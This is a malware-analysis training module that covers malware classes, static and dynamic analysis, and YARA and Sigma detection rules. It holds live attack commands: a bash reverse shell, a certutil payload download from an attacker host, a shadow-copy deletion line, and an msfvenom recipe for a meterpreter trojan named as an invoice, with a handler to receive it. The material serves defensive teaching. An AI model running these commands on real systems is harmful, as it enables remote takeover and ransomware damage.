    S07

    Session 7 — Malware Threats & Analysis

    You have written payloads and stolen credentials. Now meet the artifact itself — and learn to take it apart the way a SOC analyst does.

    In Session 5 you turned an exploit into a shell with msfvenom. In Session 6 you walked that shell up to SYSTEM. Every one of those payloads is malware — and on the other side of the fence, an analyst has to catch it, name it, and prove what it did.

    This session is both chairs at once. You will build a controlled lab trojan, then reverse the roles: hash it, strings it, detonate it in a sandbox, watch its calls home, map every behaviour to MITRE ATT&CK, and finish by writing the YARA and Sigma rules that would have caught it. Attack informs defence — that is the whole point of learning malware.

    ⏱ ~3.5 hours◆ 9 mini-labs + 5 build labs🔑 Deliverable: an incident triage report
    How this session runs

    Every theory page ends with a ▶ Prove it mini-lab — one or two commands that make the idea real on your own machine. The stepped diagrams play: press Play and watch each attack unfold one message at a time. Read nothing passively — run it, watch it, then read the log it left.

    S07 · P02Recap · where this fits⏱ 4 min

    From "I Have a Shell" to "What Is This File?"

    Sessions 5–6 made you the operator. Session 7 makes you the analyst who receives the operator's artifact and has to explain it.

    The thread so far

    You have been the attacker for three sessions: enumerate (S3–4), exploit (S5), escalate (S6). Each step left a file or a process on disk — a payload, a dumped hash, a persistence binary. To the blue team, all of those are malware samples that landed on an endpoint and need triage. Today you learn the discipline that turns "something suspicious ran" into a named, mapped, reportable incident.

    The reframe

    Your payload is someone else's incident. Learning to analyse malware makes you a better attacker (you see what gets caught) and a better defender (you catch it). Today you sit in both chairs on the same file.

    S07 · P03Why · impact⏱ 5 min

    Why Malware Is the Center of Gravity

    Almost every breach you will ever investigate has malware somewhere in its chain. Here is why this is the highest-leverage skill in the room.

    The scale problem

    Malware is not a niche. It is the delivery mechanism for ransomware, the persistence for espionage, and the payload for almost every commodity intrusion. AV vendors see hundreds of thousands of new samples every day — far too many for humans to reverse one by one, which is exactly why automated static/dynamic triage and signatures (YARA, Sigma) exist.

    ~560Knew malware samples seen per day by AV telemetry — the reason triage is automated
    Ransomwarethe most costly malware class — encrypt, extort, leak; a single family can hit thousands of orgs
    Filelessa large share of modern intrusions never drop an .exe — they live in PowerShell, WMI, and the registry
    Real-world anchor — WannaCry (2017)

    A worm (self-propagating, no user click) carrying a ransomware payload, spreading over the same MS17-010 / EternalBlue flaw you exploited in Session 5. It hit ~200,000 machines across 150 countries in days — hospitals, telecoms, logistics. One malware sample, every concept in this session: worm propagation, a ransomware payload, a killable C2 domain, and IOCs the whole industry raced to write. You already know how its front door worked.

    Why you specifically

    You are the person who receives the file. When an endpoint flags something, someone has to say what it is, what it did, and how to catch the next one. That someone is a SOC analyst who can read a binary — the skill this session builds.

    S07 · P04Method · the map⏱ 8 min

    The Malware Family Tree

    Seven classes cover almost everything you will triage. Learn what separates them — propagation, purpose, and how they hide.

    Classify by behaviour, not by name

    Vendors give malware colourful names, but for triage you classify by how it spreads and what it is for. Those two axes tell you what to look for. Click each class for its defining behaviour and the tell that gives it away.

    ▶ Prove it — classify by behaviour, not by name
    # Ask three questions of any sample and you have its class:
#  1. Does it need a user to click it?   click = virus/trojan   no-click = worm
#  2. What is it FOR?                     control = RAT   money = ransomware
#  3. Is there even a file on disk?        no file = fileless / LOLbin

    You should see: you can place almost any real sample into one of the seven boxes with three questions — and the box tells you what evidence to go looking for.

    The two axes

    Propagation × purpose. How it spreads (click / no-click / attaches / self-contained) and what it is for (control / money / theft / concealment). Name it by behaviour and the triage checklist writes itself.

    S07 · P05Method · kill chain⏱ 7 min

    How Malware Lives — Delivery to Actions

    Every sample, whatever its class, moves through the same stages. Watch the lifecycle play out — each stage is where a detection lives.

    One lifecycle, many families

    A trojan, a worm, and ransomware differ in how they do each stage, but they share the same skeleton: get in, run, stay, phone home, act. Learning the skeleton means you always know what stage you are looking at — and each stage leaves its own kind of evidence. Press Play.

    ▶ Prove it — name the stage from the evidence
    # Match each observation to a lifecycle stage:
#  'winword.exe -> powershell.exe -enc ...'        =>  EXECUTION
#  'HKCU\...\Run  = C:\Users\...\update.exe'         =>  PERSISTENCE
#  'beacon to 45.66.12.9:443 every 60s'            =>  C2
#  '3,000 files renamed to .locked in 40s'          =>  ACTIONS (ransomware)

    You should see: the same five-stage skeleton lets you place any single piece of evidence into the story — which is exactly how you write the incident timeline in Lab E.

    Detection lives at every stage

    You do not need to catch delivery to catch the malware. Persistence, C2, and actions each leave loud, specific evidence. Miss the email? Catch the Run key, the beacon, or the mass-encryption. Defence in depth = a detection at every stage.

    S07 · P06Attack · remote control⏱ 7 min

    Trojans & RATs — The Attacker's Live Console

    The class you already built. Watch a RAT connect back and hand the operator a console — then prove the concept with a listener.

    You have already written one

    Your Session 5 reverse shell is a RAT in miniature: a payload that connects back to the attacker and accepts commands. Real RATs (njRAT, DarkComet, Quasar) wrap that in a GUI with file browsing, keylogging, and webcam access — but the core is the callback. Watch how the trojan reverses the connection so it beats the victim's firewall.

    ▶ Prove it — watch a reverse callback with a bare listener (no malware needed)
    # On your Kali 'attacker' box, start a listener:
nc -lvnp 4444
# On the 'victim' (another shell), connect back and hand over a shell:
bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
# the listener now drives the victim shell — that is the RAT core, minus the GUI

    You should see: the attacker's terminal now controls the victim's shell. Every RAT is this callback plus features. Note the connection is outbound from the victim — the reason firewalls miss it.

    The RAT signature

    Reverse = victim dials out. That is why RATs use outbound 443/80 and why egress filtering and beacon detection (a steady connection to a rare host) are the controls that catch them — not the inbound firewall.

    S07 · P07Attack · propagation⏱ 7 min

    Viruses vs Worms — Who Needs the Click

    One waits for a human; one does not. That single difference decides how fast an outbreak moves — and how you contain it.

    The one distinction that matters

    A virus attaches to a host file and spreads only when a user runs that file. A worm self-propagates — it finds the next vulnerable host and infects it directly, no click required. That is why worms cause outbreaks (WannaCry hit 200k hosts in days) while viruses spread at human speed. Watch a worm move.

    ▶ Prove it — see the propagation signature (safe, no real worm)
    # The worm TELL is one host hitting many on one port. Simulate the scan half only:
nmap -p445 --open 192.168.56.0/24    # one source -> many dests, same port
# In a SOC this fan-out pattern from a single internal host = worm/lateral-movement alert

    You should see: the fan-out pattern — one internal source touching many destinations on a single port — is the network signature of both worm propagation and lateral movement. Segmentation is what stops it.

    Click or no click

    Worm = no human needed = outbreak speed. Contain viruses by stopping execution (user training, app-whitelisting); contain worms by segmentation and patching — you cannot out-click an exponential curve.

    S07 · P08Attack · encrypt & extort⏱ 7 min

    Ransomware — The Business Model

    The most costly malware class. Watch the encrypt-and-extort flow — and see why the loud, fast file rewrite is also its weakness.

    Malware as a business

    Ransomware is malware with a revenue model: encrypt what the victim needs, sell the key back, and — in modern "double extortion" — also threaten to leak the stolen copy. It usually arrives via a trojan or a worm, escalates (S6), disables recovery, then encrypts. The encryption is deliberately fast and total — which is exactly the behaviour a defender can catch.

    ▶ Prove it — spot the recovery-kill command (the earliest, loudest tell)
    # This one line appears in almost every Windows ransomware sample BEFORE encryption:
vssadmin.exe delete shadows /all /quiet
# A Sigma rule on 'vssadmin delete shadows' catches ransomware while files are still intact.

    You should see: the backup-deletion step happens before mass encryption — so a rule on vssadmin delete shadows is an early-warning that can save the data. This becomes part of your Lab D rules.

    Its strength is its weakness

    Ransomware is loud on purpose. It must delete backups and rewrite everything fast — and that mass, high-speed file activity plus vssadmin is one of the most catchable behaviours in all of malware. Detect the behaviour, not the family.

    S07 · P09Attack · living off the land⏱ 7 min

    Fileless Malware — Nothing to Hash

    The class that breaks static analysis: no malicious file on disk, just trusted tools doing untrusted things. Learn where it hides.

    Why fileless defeats the file-scanner

    Static analysis and AV signatures assume there is a file to examine. Fileless malware removes that assumption: it runs in memory using tools already trusted on the box — PowerShell, wmic, rundll32, mshta, the registry. This is "living off the land," and the binaries it abuses are "LOLbins." You catch it by behaviour, not by hash. Click each hiding place.

    ▶ Prove it — prove "trusted binary, untrusted argument" with certutil
    # certutil is a signed, trusted Windows binary — attackers use it to DOWNLOAD payloads:
certutil.exe -urlcache -split -f http://attacker/payload.exe C:\Users\Public\p.exe
# The binary is legit; the argument is the malware. Detection keys on the command line, not the hash.

    You should see: there is no malicious file to scan — the "malware" is a legitimate signed tool plus a hostile argument. This is why fileless detection lives in process command-line logging, which you will rule on in Lab D.

    Behaviour beats hash

    You cannot hash what is not on disk. Fileless malware forces the shift from file-signatures to behavioural detection: command lines, parent-child process trees, script-block logs. Static analysis alone will miss it — which is why the next block is dynamic analysis.

    S07 · P10Method · the analyst's toolkit⏱ 6 min

    Static vs Dynamic — Look, Then Detonate

    The two halves of malware analysis. One reads the file without running it; the other runs it and watches. You need both.

    The safe order of operations

    Faced with an unknown sample, you always go static first, dynamic second. Static analysis is safe — you never execute the file, so you can learn a lot with zero risk. Dynamic analysis is powerful but dangerous — you actually run the malware, so it only happens in an isolated sandbox. Click each side.

    ▶ Prove it — do the safe half right now on any file
    # Static needs no sandbox — start with identity:
sha256sum suspicious.bin        # the hash: paste into VirusTotal for reputation
file suspicious.bin              # what kind of file is it really?
strings -n 8 suspicious.bin | less   # URLs, IPs, commands in cleartext

    You should see: three commands, zero risk, and you often already know if a file is malicious — a hash hit on VirusTotal plus a hardcoded C2 URL in the strings is frequently enough. Dynamic analysis then confirms behaviour.

    Order and safety

    Static first (free, safe), dynamic second (powerful, isolated). Static tells you what it is; dynamic tells you what it does. Packing can blind static analysis — running the sample is what forces the truth out.

    S07 · P11Tool · hashes + VirusTotal⏱ 7 min

    Static Analysis I — Hash It, Look It Up

    The first thirty seconds of every triage: compute the hash, check the world's reputation databases. Often you are already done.

    Identity before anything else

    Before you read a single string, you fingerprint the file with a cryptographic hash. The hash is the sample's identity: paste it into VirusTotal and you inherit the analysis of 70+ AV engines plus everyone who has seen it before. A known-bad hash ends triage in seconds; a never-seen hash tells you it may be targeted or freshly built.

    Hashing + VirusTotal — the 7-part frame

    What it isA cryptographic hash (MD5/SHA-1/SHA-256) is a fixed fingerprint of the file's exact bytes; VirusTotal is a free multi-engine reputation and analysis service you query by hash or upload.
    Why it existsTo answer "has the world seen this file, and is it known bad?" in seconds — and to share IOCs (the hash) with your team and threat intel without moving the sample.
    The methodCompute the SHA-256, search VirusTotal by hash first (searching never uploads — safer for sensitive samples). Only upload if it is unknown and you accept it becomes public.
    Real syntax
    # Linux
sha256sum sample.bin
# Windows
Get-FileHash sample.bin -Algorithm SHA256
certutil -hashfile sample.bin SHA256
# then paste the hash into virustotal.com (search, do not upload sensitive files)
    Read the outputVT shows a detection ratio (e.g. 58/72), engine names/family labels, first-seen date, and a behaviour tab. High ratio + a named family = known malware. 0/72 on a never-seen file = suspicious in its own right.
    What it feedsThe hash becomes an IOC in your report and a block-list entry; the family label points you at existing write-ups; unknown → escalate to strings/dynamic.
    SOC flipHashes are cheap detections but brittle — one changed byte = a new hash. That is why you also write behavioural rules (YARA/Sigma). Hash blocklists catch commodity malware; behaviour catches the variants.
    ▶ Prove it — fingerprint a file and reason about the ratio
    sha256sum /bin/ls          # any file works for the mechanics
# imagine VT returns:  3/72  ->  likely false positives, treat with suspicion but not confirmed
#                     58/72  ->  confirmed known malware, block the hash now
#                      0/72  ->  never seen: could be brand-new/targeted — go static+dynamic

    You should see: the same tool and the same 20 seconds; the ratio is what you interpret. Note that both a very high and a suspicious file with zero detections are meaningful — "unknown" is not "safe."

    Cheap, fast, first — but brittle

    Always hash first. It is free, safe, and often decisive. But a hash identifies one exact file — change a byte and it is new. Reputation catches the known; the rest of this session catches the unknown.

    S07 · P12Tool · strings + PE imports⏱ 8 min

    Static Analysis II — Read What the File Carries

    Inside every binary are the URLs it calls, the commands it runs, and the Windows APIs it needs. Learn to read a sample's intentions.

    The binary tells on itself

    Even without running it, a sample leaks intent. Strings pulls out human-readable text — hardcoded C2 URLs, IP addresses, registry keys, commands, ransom-note text. The PE import table lists the Windows API functions it links to, which reveals capabilities: import CryptEncrypt and it can encrypt (ransomware?); import InternetOpenUrl and it talks to the network.

    strings + PE imports — the 7-part frame

    What it isstrings extracts printable character sequences from a binary; a PE viewer (PE-bear, PEStudio, Dependency Walker, pefile) parses the executable header and lists imported DLLs/functions.
    Why it existsTo infer what a program can do and who it talks to without executing it — the safest possible source of intelligence about a sample.
    The methodRun strings (both ASCII and Unicode), grep for URLs/IPs/keywords; open the PE and read the import table for suspicious API clusters (crypto, network, process injection, persistence).
    Real syntax
    strings -n 8 sample.exe            # ASCII
strings -e l -n 8 sample.exe       # UTF-16LE (Windows)
strings sample.exe | grep -Ei 'http|\.exe|reg add|HKCU|[0-9]{1,3}(\.[0-9]{1,3}){3}'
# imports:
python3 -c "import pefile,sys;print('\n'.join(i.dll.decode() for i in pefile.PE(sys.argv[1]).DIRECTORY_ENTRY_IMPORT))" sample.exe
    Read the outputURLs/IPs → C2 IOCs. Command strings (vssadmin, schtasks, powershell -enc) → behaviour. Import clusters: CryptEncrypt/CryptGenKey=crypto, VirtualAllocEx/WriteProcessMemory/CreateRemoteThread=injection, WinExec/URLDownloadToFile=download+run.
    What it feedsC2 URLs/IPs become network IOCs; suspicious strings become the literals in your YARA rule (Lab D); import clusters predict what dynamic analysis will confirm.
    SOC flipFew strings + tiny import table = a packer. A near-empty import table (just LoadLibrary/GetProcAddress) means the real imports are hidden until runtime — itself a strong "this is malware" signal that pushes you to dynamic analysis.
    ▶ Prove it — pull intent out of a binary with strings
    strings -n 8 /usr/bin/curl | grep -Ei 'http|://|%s' | head
# On a real sample you would see hardcoded C2:
#   http://45.66.12.9/gate.php     <- C2 IOC
#   vssadmin delete shadows /all   <- ransomware behaviour
#   SOFTWARE\Microsoft\Windows\CurrentVersion\Run  <- persistence

    You should see: readable strings often hand you the C2 address and the malware's behaviour for free. On real samples these exact strings become the pattern lines of your YARA rule.

    Strings for intent, imports for capability

    Strings tell you who it talks to; imports tell you what it can do. A near-empty import table is itself a red flag — it means the sample is packed, and the truth only comes out when you run it.

    S07 · P13Method · isolation first⏱ 7 min

    Dynamic Analysis 0 — Build the Blast Chamber

    Before you run a single sample, you build the room you run it in. Get isolation wrong and you infect yourself or your network.

    The rule you never break

    Dynamic analysis means executing live malware. Do it wrong and the sample spreads to your host, your network, or the internet. So the analyst's first job is the blast chamber: a disposable VM with a snapshot, no path to anything you care about, and monitoring tools armed before detonation.

    Non-negotiable isolation checklist

    1) Snapshot the clean VM (you will revert after every run). 2) Host-only / no network, or a fake-internet like INetSim, so the sample cannot reach real victims or its real C2. 3) No shared folders / clipboard to the host. 4) Non-persistent — treat the VM as burned after each detonation. 5) Tools armed first (ProcMon, TCPView running before you double-click).

    ▶ Prove it — verify isolation before you ever detonate
    # On the analysis VM, PROVE it cannot reach the real world before running anything:
ping -c1 8.8.8.8            # should FAIL (or hit your fake-internet, never the real one)
ip route                    # confirm no route to your host/LAN
# only when this is right do you take the snapshot and arm the tools

    You should see: if the VM can reach 8.8.8.8, so can the malware — stop and fix isolation first. Confirming containment is the step beginners skip and regret.

    Chamber before sample

    Never run malware on anything you cannot burn. Snapshot, isolate the network, arm the tools — in that order — every single time. The discipline is the skill; the tools are easy.

    S07 · P14Tool · ProcMon + TCPView⏱ 8 min

    Dynamic Analysis — Watch the Malware Work

    Detonate in the chamber and read the behaviour: what it spawns, what it changes, and who it calls. This is what packing cannot hide.

    Three lenses on one detonation

    With the chamber built, you run the sample and watch through three lenses: ProcMon (every file, registry, and process operation), TCPView / CurrPorts (live network connections per process), and a packet capture for the C2 detail. Together they reconstruct the lifecycle you learned on P4 — execution, persistence, C2, actions — from live evidence.

    ProcMon + TCPView + CurrPorts — the 7-part frame

    What it isProcess Monitor (ProcMon) logs real-time file/registry/process/thread activity; TCPView and CurrPorts show live TCP/UDP endpoints per process — all Sysinternals-class behavioural monitors.
    Why it existsTo capture what the malware actually does at runtime — the behaviour a packer or obfuscator cannot hide, because the code must unpack and act to function.
    The methodArm all tools, detonate, let it run, then filter ProcMon to the sample's process (and its children): watch for a Run-key write (persistence), a dropped file, and TCPView lighting up with an outbound connection (C2).
    Real syntax
    # ProcMon filter: Process Name is sample.exe -> Include
#   look for RegSetValue on ...\CurrentVersion\Run   (persistence)
#   CreateFile of a dropped payload in %TEMP% / %APPDATA%
# TCPView: sample.exe -> ESTABLISHED 45.66.12.9:443   (C2 IOC)
# capture the beacon:
wireshark  # or:  tcpdump -i any host 45.66.12.9 -w beacon.pcap
    Read the outputParent→child tree (Word→PowerShell = bad), a Run-key / scheduled-task write = persistence, a dropped file = second stage, an outbound connection to a rare host/port = C2. Each maps to an ATT&CK technique.
    What it feedsThe behaviours become the incident timeline and the IOCs (dropped filenames, C2 IP/port, registry paths) — and the fields your Sigma rule keys on in Lab D.
    SOC flipEverything you watch here has a log-side twin: the Run-key write → Sysmon 13, the process spawn → Sysmon 1 / Event 4688, the connection → Sysmon 3. Dynamic analysis literally teaches you which fields to detect on.
    ▶ Prove it — watch a "sample" make a connection — the dynamic core
    # Simulate the detonation-and-watch loop with a benign process:
ss -tnp        &   # live connections per process (the Linux TCPView)
curl -s http://example.com >/dev/null   # the 'sample' makes an outbound connection
ss -tnp | grep curl        # you just caught the process's C2-equivalent connection

    You should see: you correlated a process to the connection it made — exactly what TCPView does with a real sample. On malware this same step hands you the C2 IP that becomes a network IOC.

    Behaviour is the ground truth

    Packing hides strings; it cannot hide behaviour. To function, malware must run — and when it runs, ProcMon and TCPView see the persistence, the drop, and the beacon. Dynamic analysis is where the truth comes out, and where your detection rules are born.

    S07 · P15Hands-on · everyone · build⏱ 14 min

    Lab A — Build a Controlled Trojan

    Create the artifact you will spend the rest of the session analysing. This is the Session 5 payload, reframed as a malware sample.

    Why build your own sample

    Analysing a real live sample as a beginner is risky and legally fraught. So you build a known, controlled trojan with msfvenom — you know exactly what it does, which makes it the perfect teaching sample: every string, import, and behaviour you find later, you can check against ground truth.

    Lab-only, isolated network

    This produces working malware. Keep it on the host-only lab network, never email or upload it, and delete it when the session ends. The AV on your own host will flag it — that is the SOC flip working; build it on Kali.

    1. Generate the trojan — a Windows reverse-shell payload disguised as an executable (the S5 technique, now our sample): 
      msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.56.101 LPORT=443 \
  -f exe -o /tmp/lab/invoice_2026.exe

      ✓ Verification

      • invoice_2026.exe is written — a benign-looking name hiding a RAT payload. That disguise is what makes it a trojan.
    2. Record ground truth — note what you know so you can check your analysis against it: 
      # You KNOW: payload=meterpreter reverse_tcp, C2=192.168.56.101:443, format=PE exe
sha256sum /tmp/lab/invoice_2026.exe    # this is your sample's identity

      ✓ Verification

      • You have the hash and the true behaviour on record. Later, strings/dynamic analysis should rediscover the C2 you already know — proving the method works.
    3. Stage a listener (optional, for the dynamic lab) so the "C2" is there when the sample beacons: 
      # in msfconsole:
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.56.101
set LPORT 443
run

      ✓ Verification

      • The handler waits. When you detonate in Lab C, the sample connects back here — and TCPView will show it.
    Your ground-truth sample

    You now own a sample whose truth you know. Everything from here — hash, strings, imports, behaviour — you can grade against reality. That is why we build before we analyse.

    S07 · P16Hands-on · everyone · analyse⏱ 16 min

    Lab B — Take the Sample Apart (Without Running It)

    Run the full static workflow on your Lab A trojan: hash, reputation, strings, imports. Rediscover the truth you already know.

    Prove the safe half works

    You know this sample's C2 and payload. Now find them the analyst way — without executing it. If static analysis rediscovers the C2 address and the RAT capability, you have proven the workflow you will use on samples whose truth you don't know.

    1. Identity + reputation — hash it and reason about VirusTotal: 
      sha256sum /tmp/lab/invoice_2026.exe
# search the hash on VirusTotal (do not upload — it is lab malware).
# A vanilla msfvenom payload is well-known: expect a HIGH detection ratio + 'Meterpreter' labels.

      ✓ Verification

      • A high ratio and a family label confirm it is known-bad in seconds — and show why attackers encode/pack to change the hash.
    2. Strings — pull readable intent: 
      strings -n 8 /tmp/lab/invoice_2026.exe | less
strings -n 8 /tmp/lab/invoice_2026.exe | grep -Ei '[0-9]{1,3}(\.[0-9]{1,3}){3}|http|ws2_|ssl'

      ✓ Verification

      • Networking-related strings (WinSock / SSL) appear, hinting at the callback. A raw payload may also leak host/port artifacts — the C2 you already know.
    3. PE imports — read capability from the import table: 
      python3 -c "import pefile;pe=pefile.PE('/tmp/lab/invoice_2026.exe');[print(e.dll.decode()) for e in pe.DIRECTORY_ENTRY_IMPORT]"
# expect ws2_32.dll (sockets) -> it talks to the network. A tiny import table -> it is encoded/packed.

      ✓ Verification

      • ws2_32.dll (Windows Sockets) in the imports predicts network C2 — capability inferred without running anything. A near-empty table would itself flag packing.
    4. Write down the IOCs you recovered — hash, any host/port, capability — for the report and the YARA rule: 
      # IOC sheet (Lab E + Lab D input):
#   sha256: 
#   c2:     192.168.56.101:443   (recovered / expected)
#   caps:   network sockets, remote shell (meterpreter)

      ✓ Verification

      • You reconstructed the sample's identity and intent with zero execution. These IOCs feed straight into your YARA rule and incident report.
    Static rediscovered the truth

    You found the capability and the C2 without running it. That is the power of static analysis — and its limit: a packed sample would have shown a near-empty import table, forcing you into the sandbox. Which is Lab C.

    S07 · P17Hands-on · everyone · detonate⏱ 18 min

    Lab C — Detonate and Watch

    Now run the sample in the chamber and capture its live behaviour: the callback, the process, the connection. Behaviour is the proof.

    From "what it is" to "what it does"

    Static said this sample can talk to the network. Dynamic proves it does — you will watch it open the exact connection to your C2. Same sample, the other half of the discipline, inside the isolated chamber from P12.

    Chamber checklist first

    Snapshot taken, network host-only, tools armed (a live connection monitor running), listener staged. Only then detonate. Revert the snapshot when you are done.

    1. Arm the network monitor before launching — the equivalent of TCPView on your lab box: 
      # on the analysis host, watch live connections continuously:
watch -n1 'ss -tnp'      # Linux 'TCPView'   (on Windows: run TCPView.exe)

      ✓ Verification

      • The monitor is running before detonation, so you catch the very first beacon — the mistake beginners make is arming it too late.
    2. Detonate the sample (in the isolated VM) and watch the connection appear: 
      # launch the sample (Windows VM):  .\invoice_2026.exe
# within seconds the monitor shows:
#   invoice_2026.exe  ->  192.168.56.101:443   ESTABLISHED

      ✓ Verification

      • The outbound connection to your C2 lights up — the RAT callback, exactly as the static import table predicted. That is dynamic confirmation.
    3. Confirm control at the listener — the operator side proves it is a live RAT: 
      # back in msfconsole the handler reports:
#   [*] Meterpreter session 1 opened (192.168.56.101:443 -> victim)
meterpreter> getuid      # you are now driving the victim

      ✓ Verification

      • A session opens: the sample is a working RAT, proven by behaviour, not inference. Note the session for the timeline.
    4. Capture the behavioural IOCs — process, connection, any persistence — then revert: 
      # record for the report:

#   network: 192.168.56.101:443 outbound  (C2 IOC)

# then: revert the VM snapshot

    S07 · P19Method · the common language⏱ 7 min

    S07 · P20Defensive · what to hunt⏱ 7 min

    Indicators of Compromise — Host, Network, Behaviour

    Analysis produces evidence; detection needs indicators. Learn the three tiers of IOC and why the durable ones are behavioural.

    Not all indicators are equal

    Your labs produced indicators: a hash, a C2 IP, a filename, a registry path, a process behaviour. These sit on a Pyramid of Pain — the higher up, the more it costs the attacker to change, and the more durable your detection. A hash is trivial to change; a behaviour (TTP) is expensive. Click each tier.

    ▶ Prove it — sort your lab IOCs by durability
    # From Labs B/C, rank what you would deploy:
#   sha256 hash            -> HOST   (block, but expect it to change)
#   192.168.56.101:443     -> NETWORK (block C2, decent shelf life)
#   'unsigned exe in %TEMP% making outbound 443 + Run-key' -> TTP (durable rule)
# invest most in the bottom line — the behaviour

    You should see: the same incident yields indicators at three durabilities. Blocking the hash is instant but temporary; the behavioural rule is harder to write but survives the attacker's next rebuild.

    Climb the pyramid

    Block the hash today, but detect the behaviour forever. Host IOCs are free wins with a short shelf life; behavioural detections cost more to write and cost the attacker far more to evade. Both go in the report — weight your effort upward.

    S07 · P21Tool · write the signature⏱ 8 min

    YARA — Signatures for Files

    The analyst's pattern-matching language: describe what a malware family looks like on disk, then hunt for it across every endpoint.

    Turn your strings into a hunt

    In Lab B you pulled distinctive strings out of the sample. YARA lets you turn those into a portable signature: a rule that matches any file containing that combination of patterns. Write one good rule and you catch not just your sample but its whole family — across every box you can scan.

    YARA — the 7-part frame

    What it isA rule language and scanner for classifying files by content patterns — text strings, hex byte sequences, and conditions combining them. The de facto standard for file-based malware signatures.
    Why it existsTo share "this family looks like this" in a portable, precise way, so any analyst or tool can hunt for a family across many files at once — on endpoints, in email gateways, in threat-intel feeds.
    The methodPick distinctive strings/bytes from your static analysis (unique enough to avoid false positives), then write a condition that requires a meaningful combination — not any one common string.
    Real syntax
    rule Lab_Meterpreter_Trojan {
  meta:
    author = "soc-student"
    ref    = "session 7 lab"
  strings:
    $c2   = "192.168.56.101" ascii
    $api1 = "ws2_32.dll" ascii nocase
    $mz   = { 4D 5A }            // PE magic
  condition:
    $mz at 0 and $api1 and $c2
}

// scan:  yara -r lab_rules.yar /samples/
    Read the outputYARA prints RuleName filepath for every match. A hit means the file contains your pattern combination — verify it is a true positive, then treat matches as the same family.
    What it feedsA validated rule goes to the EDR/scanner and the threat-intel share; matches become new samples to triage; the rule name maps back to an ATT&CK/family label in the report.
    SOC flipYARA is content-based, so it beats hash-rotation but not packing. A packer hides your strings until runtime — so pair file-side YARA with log-side Sigma (behaviour) for coverage the attacker cannot dodge by re-encoding.
    ▶ Prove it — write and run a tiny YARA rule
    cat > demo.yar <<'EOF'
rule finds_c2_string {
  strings: $c2 = "192.168.56.101" ascii
  condition: $c2
}
EOF
yara demo.yar /tmp/lab/invoice_2026.exe    # prints the rule name + path on a match

    You should see: your first working signature. On a match YARA prints finds_c2_string /tmp/lab/invoice_2026.exe — you just built a hunt that finds this sample anywhere. Broaden the condition to catch the family, not just one file.

    Signatures scale your analysis

    One good rule catches a family, not a file. The skill is choosing distinctive patterns and a combining condition — specific enough to avoid false positives, general enough to catch variants. That judgement is the craft.

    S07 · P23Hands-on · everyone · the signature exercise⏱ 18 min

    Lab D — Detect the Malware You Analysed

    Turn your own analysis into working detections: a YARA rule for the file and a Sigma rule for the behaviour. This is the session's core skill.

    Why this is the defining exercise

    You have a sample and its behaviour on record. Now write the two rules that would have caught it — a YARA rule matching its content and a Sigma rule matching its behaviour in logs. File-side and log-side together give coverage the attacker cannot dodge by re-encoding one and not the other.

    Use your own IOC sheet from Labs B–C

    You need the strings/imports from Lab B and the process/connection behaviour from Lab C. No lab? The fallbacks (saved/) contain a sample IOC sheet and event log.

    Rule 1 — YARA (file content)

    Match the sample by a combination of distinctive content — specific enough not to fire on benign files.

    rule Session7_Lab_Trojan {
  meta:
    author = "soc-student"
    desc   = "lab meterpreter trojan — session 7"
    ref    = "attack.t1071.001"
  strings:
    $mz   = { 4D 5A }                 // PE magic at offset 0
    $ws   = "ws2_32.dll" ascii nocase // networking capability
    $c2   = "192.168.56.101" ascii    // recovered C2 (adjust to yours)
  condition:
    $mz at 0 and $ws and $c2          // PE + sockets + this C2 = our family
}

// hunt across a tree:
yara -r session7_lab.yar /samples/

    Rule 2 — Sigma (behaviour in logs)

    Catch the behaviour even if the file is re-encoded: an unsigned binary in a user-writable path making an outbound connection.

    title: Suspicious Outbound From User-Writable Path
logsource:
  product: windows
  category: network_connection      # Sysmon Event ID 3
detection:
  selection:
    Initiated: 'true'
    Image|startswith:
      - 'C:\Users\'
      - 'C:\Windows\Temp\'
      - 'C:\ProgramData\'
  filter_ports:
    DestinationPort:
      - 80
      - 443
  condition: selection and filter_ports
tags: [attack.command_and_control, attack.t1071.001]
level: medium
    1. Write the YARA rule from your Lab B strings and validate it fires only on the sample: 
      yara session7_lab.yar /tmp/lab/invoice_2026.exe   # should MATCH
yara session7_lab.yar /usr/bin/                    # should NOT match benign files

      ✓ Verification

      • A rule that matches the sample and not your /usr/bin is well-scoped — specific patterns + a combining condition avoid false positives.
    2. Reason about the Sigma rule: which of your Lab C observations does it key on, and how would you tighten it? 
      # Lab C gave you: invoice_2026.exe in a user path -> outbound 443.
# The rule fires on that shape. Tighten with: Image not signed, or add a beacon-interval
# correlation so you alert on the REPEATED connect, not a single one.

      ✓ Verification

      • You mapped a real observed behaviour to a log rule and identified how to cut its false positives — the actual daily work of a detection engineer.
    3. Map each rule to ATT&CK so the alert tells the next analyst what it means: 
      # YARA  Session7_Lab_Trojan  -> T1071.001 (Web C2)
# Sigma outbound-from-user-path -> T1071.001 (Web C2)
# a fired alert now carries its technique — self-documenting detection

      ✓ Verification

      • Both rules carry their technique tag, so an alert is self-explanatory. This is why you mapped to ATT&CK on P18.
    Two rules, full coverage

    YARA catches the file; Sigma catches the behaviour. Re-encoding beats the hash and maybe the YARA strings — but the behavioural Sigma rule still fires. Layered detection is how you catch the variant you have never seen.

    S07 · P24Defensive · defense in depth⏱ 6 min

    Countermeasures — Break the Lifecycle at Every Stage

    No single control stops malware. You place a barrier at each lifecycle stage so that when one fails, the next catches it.

    Map controls to the lifecycle

    You learned the five-stage lifecycle on P4. Defence in depth means putting a control at every stage, so the attacker has to beat all of them, not one. Miss delivery? Block execution. Miss execution? Catch persistence or the beacon. This is why layered defence works even against novel samples.

    Lifecycle stageControl that breaks itWhy it works
    Deliveryemail filtering + attachment sandboxing; block macros from the internet; user awarenessmost malware still arrives by phish — stop it before it lands
    Executionapplication allow-listing (WDAC/AppLocker); disable Office macros; SmartScreenif only known-good can run, the trojan never starts
    Persistencemonitor autoruns/services (Sysmon 13/7045); least privilegepersistence is loud and rare — a high-signal detection point
    C2egress filtering; DNS filtering; proxy inspection; beacon detectioncut the callback and a RAT is deaf and dumb
    Actions / Impactoffline + immutable backups; segmentation; EDR behavioural blocking; LSASS protection (Credential Guard)limits blast radius and guarantees ransomware recovery without paying
    Across allpatch (EternalBlue!); EDR/AV with real-time protection; least privilege; logging + a SOC that reads itthe fundamentals that make every stage above harder
    ▶ Prove it — check the two controls that stop the most malware
    # 1) Are macros from the internet blocked? (stops a huge share of delivery+execution)
#    Group Policy: 'Block macros from running in Office files from the Internet' = Enabled
# 2) Is egress filtering on? Try to reach a random high port outbound:
